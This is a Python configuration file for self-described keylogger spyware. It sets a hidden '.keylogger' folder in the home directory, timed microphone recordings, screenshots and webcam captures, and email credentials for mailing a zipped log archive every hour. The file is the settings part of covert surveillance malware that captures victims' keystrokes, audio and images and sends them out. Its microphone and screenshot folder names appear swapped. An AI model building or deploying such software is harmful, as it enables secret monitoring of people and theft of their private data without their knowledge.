import os

# path
name_dir = '.keylogger'
logs_file = 'logs.txt'
user = os.path.expanduser('~')
path = user + '/' + name_dir + '/'

# directory names
microphone = "scrn"
screenshots = "mcrn"
webcamera =  "wbc"

# microphone
microphone_time = 10
microphone_repeat = 120

# screen
screenshots_repeat = 120

# web camera
photo_repeat = 120
photo_width = 1080
photo_height = 1920
camera_index = 0

# mail
sender = 'example@gmail.com'
receiver = 'example@gmail.com'
password = 'example'

name_zip_archive = 'logs'
archive_name = user + '/' + name_zip_archive
send_every_seconds = 3600 # 1h
